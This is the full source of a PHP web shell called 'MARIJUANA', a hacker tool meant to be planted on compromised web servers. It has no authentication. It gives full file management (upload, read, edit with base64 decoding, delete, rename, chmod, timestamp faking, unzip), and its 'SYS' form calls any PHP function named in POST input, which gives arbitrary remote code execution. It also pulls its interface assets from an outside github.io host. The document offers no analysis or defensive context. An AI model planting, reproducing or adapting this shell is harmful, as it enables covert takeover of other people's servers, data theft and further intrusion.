<?php ob_start("ob_gzhandler");error_reporting(E_ALL);ini_set('display_errors', TRUE);ini_set('display_startup_errors', TRUE);?>
<!DOCTYPE html>
	<html dir="auto" lang="en-US">

		<head>
			<meta charset="UTF-8">
			<meta name="robots" content="noindex, nofollow">

				<title>MARIJUANA</title>

			<link rel="icon" href="//0x5a455553.github.io/MARIJUANA/icon.png" />
			<link rel="stylesheet" href="//0x5a455553.github.io/MARIJUANA/main.css" type="text/css">

			<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
			<script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
		</head>

		<body>
			<header>
				<div class="y x">
				</div>

				<div class="q x w">
				</div>
				<script src="//0x5a455553.github.io/MARIJUANA/jquery.js"></script>
			</header>

			<article>
				<div class="i">
					<i class="far fa-hdd"></i>
					<?php echo php_uname();?>

					<br />

					<i class="far fa-lightbulb"></i> &thinsp;&thinsp;<b>SOFT  :</b> <?php echo $_SERVER['SERVER_SOFTWARE'];?></span> <b>PHP :</b> <?php echo phpversion();?>
					<br />

					<i class="far fa-folder"></i>
					<?php isset($_GET["d"]) ? ($d = z($_GET["d"]) AND chdir(z($_GET["d"]))) : $d = getcwd(); $k = preg_split("/(\\\|\/)/", $d ); foreach ($k as $m => $l) { echo '<a href="?d='; for ($i = 0; $i <= $m; $i++) { echo y($k[$i]); ($i != $m) ? print '2f' : null;}echo '">'.$l.'</a>/'; }?>

					<br />

				</div>

				<div class="u">
					<?php echo $_SERVER['SERVER_ADDR'];?> <i class="fas fa-link"></i>
					<br />

					<br />

					<form method="post" enctype="multipart/form-data">
						<label class="l w">
							<input type="file" name="n[]" onchange="this.form.submit()" multiple> &nbsp;UPLOAD
						</label>&nbsp;
					</form>

				<?php
				if(isset($_FILES["n"])) {
					$z = $_FILES["n"]["name"];
					$r = count($z);
					for( $i=0 ; $i < $r ; $i++ ) {
						if (@copy($_FILES["n"]["tmp_name"][$i], $z[$i])) {
							echo '<script>$.notify("OK!", { className:"autis",autoHideDelay: 2000,position:"left bottom" });</script>';
						}
						else {
							echo '<script>$.notify("ER!", { className:"autis",autoHideDelay: 2000,position:"left bottom" });</script>';
						}
					}
				}
				?>

				</div>
				<?php
					if (isset($_GET["s"])) {
						echo '<table cellspacing="0" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th>'.$_GET["s"].'</th>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td></td>
							</tr>
							<tr>
								<td class="x">
									<textarea readonly="yes">'.htmlspecialchars(file_get_contents($_GET["s"])).'</textarea>
								</td>
							</tr>
						</tbody>
					</table>';
					}
					elseif (isset($_GET["y"])) {
						echo '<table cellspacing="0" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th>SYS</th>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td></td>
							</tr>
							<tr>
								<td class="x">
									<form method="post">
										<input type="text" name="1" />&nbsp;&nbsp;
										<input type="text" name="2" />
										<br />
										<br />
										<input type="submit" value="GO" />
									</form>
									<br />
									<textarea readonly="yes">';
					
									if(isset($_POST["2"])) {
											$a = $_POST["1"];
											$v = $_POST["2"];
											$s = ($a($v));
											var_dump($s);
											}
										
								echo '</textarea>
								</td>
							</tr>
						</tbody>
					</table>';
					}
					elseif (isset($_GET["e"])) {
						echo '<table cellspacing="0" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th>'.$_GET["e"].'</th>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td></td>
							</tr>
							<tr>
								<td class="x">
									<form method="post">
										<textarea name="e" class="o">'.htmlspecialchars(file_get_contents($_GET["e"])).'</textarea>
										<br />
										<br />
										<span class="w">BASE64</span> : 
										<select name="b64">
											<option value="0">NO</option>
											<option value="1">YES</option>
										</select>
										<br />
										<br />
										<input type="submit" class="w" value="&nbsp;OK&nbsp;">
									</form>
								</td>
							</tr>
						</tbody>
					</table>';
					if (isset($_POST["e"])) {
						if ($_POST["b64"] == "1") {
							$ex = base64_decode($_POST["e"]);
						}
						else {
							$ex = $_POST["e"];
						}
						$fp = fopen($_GET["e"], 'w');
						if (fwrite($fp, $ex)) {
							header("Location: ?d=".y($d)."&1");
							exit();
						} else {
							header("Location: ?d=".y($d)."&0");
							exit();
						}
						fclose($fp);
					  }
					}
					elseif (isset($_GET["x"])) {
						if(is_dir($_GET["x"])) {
							rmdir($_GET["x"]) ? (header("Location: ?d=".y($d)."&1") AND exit()) : (header("Location: ?d=".y($d)."&0") AND exit());
						}
						else {
						if(!unlink($_GET["x"])) {
							header("Location: ?d=".y($d)."&0");
							exit();
						}
						else {
							header("Location: ?d=".y($d)."&1");
							exit();
						}
					  }

					}
					elseif (isset($_GET["t"])) {
						echo '<table cellspacing="0" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th>'.$_GET["t"].'</th>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td></td>
							</tr>
							<tr>
								<td class="x">
									<form action="" method="post">
										<input name="t" class="x" type="text" value="'.date("Y-m-d H:i", filemtime($_GET["t"])).'">
									</form>
								</td>
							</tr>
						</tbody>
					</table>';
					if( !empty($_POST["t"]) ) {
						$p = strtotime($_POST["t"]);
						if($p) {
							if(!touch($_GET["t"],$p,$p)) {
							header("Location: ?d=".y($d)."&0");
							exit();
							}
							else {
							header("Location: ?d=".y($d)."&1");
							exit();
							}
						} else {
							header("Location: ?d=".y($d)."&0");
							exit();
						}
					  }
					}
					elseif (isset($_GET["k"])) {
						echo '<table cellspacing="0" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th>'.$_GET["k"].'</th>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td></td>
							</tr>
							<tr>
								<td class="x">
									<form action="" method="post">
										<input name="b" class="x" type="text" value="'.substr(sprintf('%o', @fileperms($_GET["k"])), -4).'">
									</form>
								</td>
							</tr>
						</tbody>
					</table>';
					if(!empty($_POST["b"])) {
						$x = $_POST["b"];
						$t = 0;
					for($i=strlen($x)-1;$i>=0;--$i)
						$t += (int)$x[$i]*pow(8, (strlen($x)-$i-1));
					if(!@chmod($_GET["k"], $t)) {
						header("Location: ?d=".y($d)."&0");
						exit();
					} else {
						header("Location: ?d=".y($d)."&1");
						exit();
						  }
						}
					}
					elseif (isset($_GET["l"])) {
						echo '<table cellspacing="0" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th>+DIR</th>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td></td>
							</tr>
							<tr>
								<td class="x">
									<form action="" method="post">
										<input name="l" class="x" type="text" value="">
									</form>
								</td>
							</tr>
						</tbody>
					</table>';
					if(isset($_POST["l"])) {
						if(!mkdir($_POST["l"])) {
							header("Location: ?d=".y($d)."&0");
							exit();
						}
						else {
							header("Location: ?d=".y($d)."&1");
							exit();
						}
					  }
					}
					elseif (isset($_GET["n"])) {
						echo '<table cellspacing="0" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th>+FILE</th>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td></td>
							</tr>
							<tr>
								<td class="x">
									<form action="" method="post">
										<input name="n" class="x" type="text" value="">
									</form>
								</td>
							</tr>
						</tbody>
					</table>';
					if(isset($_POST["n"])) {
						if(!touch($_POST["n"])) {
							header("Location: ?d=".y($d)."&0");
							exit();
						}
						else {
							header("Location: ?d=".y($d)."&1");
							exit();
						}
					  }
					}
					elseif (isset($_GET["r"])) {
						echo '<table cellspacing="0" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th>[ REN ]</th>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td></td>
							</tr>
							<tr>
								<td class="x">
									<form action="" method="post">
										<input name="r" class="x" type="text" value="'.$_GET["r"].'">
									</form>
								</td>
							</tr>
						</tbody>
					</table>';
					if(isset($_POST["r"])) {
						if(file_exists($_POST["r"])) {
							header("Location: ?d=".y($d)."&0");
							exit();
						}
						else {
							if(rename($_GET["r"], $_POST["r"])) {
								header("Location: ?d=".y($d)."&1");
								exit();
							}
							else {
								header("Location: ?d=".y($d)."&0");
								exit();
							}
						  }
					   }
					}
					elseif (isset($_GET["z"])) {
						$zip = new ZipArchive;
						$res = $zip->open($_GET["z"]);
							if ($res === TRUE) {
								$zip->extractTo(z($_GET["d"]));
								$zip->close();
								header("Location: ?d=".y($d)."&1");
								exit();
							} else {
								header("Location: ?d=".y($d)."&0");
								exit();
						  }
					}
					else {
					echo '<table cellspacing="0" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th width="44%">[ NAME ]</th>
								<th width="11%">[ SIZE ]</th>
								<th width="17%">[ PERM ]</th>
								<th width="17%">[ DATE ]</th>
								<th width="11%">[ ACT ]</th>
							</tr>
						</thead>
						<tbody>
						';

							$h = "";
							$j = "";
							$w = @scandir($d);
							if (is_array($w) || is_object($w)) {
							foreach($w as $c){
								$e = str_replace("\\", "/", $d);
								if (!strpos($c, ".zip")) {
									$zi = '';
								}
								else {
									$zi = ' <a href="?d='.y($e).'&z='.$c.'">U</a>';
								}
								if (is_writable("$d/$c")) {
										$o = "";
								}
								elseif (!is_readable("$d/$c")) {
										$o = " h";
								}
								else {
										$o = " w";
								}
								$s = @filesize("$d/$c") / 1024;
								$s = round($s, 3);
								($s >= 1024) ? $s = round($s / 1024, 2) . " MB" : $s = $s . " KB";
							if(($c != ".") && ($c != "..")){
								(is_dir("$d/$c")) ?
								$h .= '<tr class="r">
							<td><i class="far fa-folder m"></i> <a href="?d='.y($e).y("/".$c).'">'.$c.'</a></td>
							<td class="x">dir</td>
							<td class="x'.$o.'" onclick="location.href=\'?d='.y($e).'&k='.$c.'\';">'.x("$d/$c").'</td>
							<td class="x"><a href="?d='.y($e).'&t='.$c.'">'.@date("Y-m-d H:i", filemtime("$d/$c")).'</a></td>
							<td class="x"><a href="?d='.y($e).'&r='.$c.'">R</a> <a href="?d='.y($e).'&x='.$c.'">D</a></td>
						</tr>
						'
							:
								$j .= '<tr class="r">
							<td><i class="far fa-file m"></i>&thinsp; <a href="?d='.y($e).'&s='.$c.'">'.$c.'</a></td>
							<td class="x">'.$s.'</td>
							<td class="x'.$o.'" onclick="location.href=\'?d='.y($e).'&k='.$c.'\';">'.x("$d/$c").'</td>
							<td class="x"><a href="?d='.y($e).'&t='.$c.'">'.@date("Y-m-d H:i", filemtime("$d/$c")).'</a></td>
							<td class="x"><a href="?d='.y($e).'&r='.$c.'">R</a> <a href="?d='.y($e).'&x='.$c.'">D</a> <a href="?d='.y($e).'&e='.$c.'">E</a>'.$zi.'</td>
						</tr>
						';

							}
						}
					}

						echo $h;
						echo $j;
					echo '</tbody>
						<tfoot>
							<tr>
								<th class="et" width="44%">
									<a href="?d='.y($d).'&n">+FILE</a>
									<a href="?d='.y($d).'&l">+DIR</a>
								</th>
								<th class="et" width="11%"></th>
								<th class="et" width="17%"></th>
								<th class="et" width="17%"></th>
								<th class="et" width="11%"></th>
							</tr>
						</tfoot>
					</table>';
					}
					?>

			</article>
			<footer class="x">
				&copy;TheAlmightyZeus
			</footer>
			<?php
			if (isset($_GET["1"])) {
				echo '<script>$.notify("OK!", { className:"autis",autoHideDelay: 2000,position:"left bottom" });</script>';
			}
			elseif (isset($_GET["0"])) {
				echo '<script>$.notify("ER!", { className:"autis",autoHideDelay: 2000,position:"left bottom" });</script>';
			}
			else {
				NULL;
			}
			?>

		</body>
	</html>

<?php
	function x($c) {
	$x = @fileperms($c);
	if (($x & 0xC000) == 0xC000) {
		$u = "s";
	} elseif (($x & 0xA000) == 0xA000) {
		$u = "l";
	} elseif (($x & 0x8000) == 0x8000) {
		$u = "-";
	} elseif (($x & 0x6000) == 0x6000) {
		$u = "b";
	} elseif (($x & 0x4000) == 0x4000) {
		$u = "d";
	} elseif (($x & 0x2000) == 0x2000) {
		$u = "c";
	} elseif (($x & 0x1000) == 0x1000) {
		$u = "p";
	} else {
		$u = "u";
	}
	$u .= (($x & 0x0100) ? "r" : "-");
	$u .= (($x & 0x0080) ? "w" : "-");
	$u .= (($x & 0x0040) ? (($x & 0x0800) ? "s" : "x") : (($x & 0x0800) ? "S" : "-"));
	$u .= (($x & 0x0020) ? "r" : "-");
	$u .= (($x & 0x0010) ? "w" : "-");
	$u .= (($x & 0x0008) ? (($x & 0x0400) ? "s" : "x") : (($x & 0x0400) ? "S" : "-"));
	$u .= (($x & 0x0004) ? "r" : "-");
	$u .= (($x & 0x0002) ? "w" : "-");
	$u .= (($x & 0x0001) ? (($x & 0x0200) ? "t" : "x") : (($x & 0x0200) ? "T" : "-"));
	return $u;
}
?>
<?php
function y($n){
    $y='';
    for ($i=0; $i < strlen($n); $i++){
        $y .= dechex(ord($n[$i]));
    }
    return $y;
}
function z($y){
    $n='';
    for ($i=0; $i < strlen($y)-1; $i+=2){
        $n .= chr(hexdec($y[$i].$y[$i+1]));
    }
    return $n;
}
?>
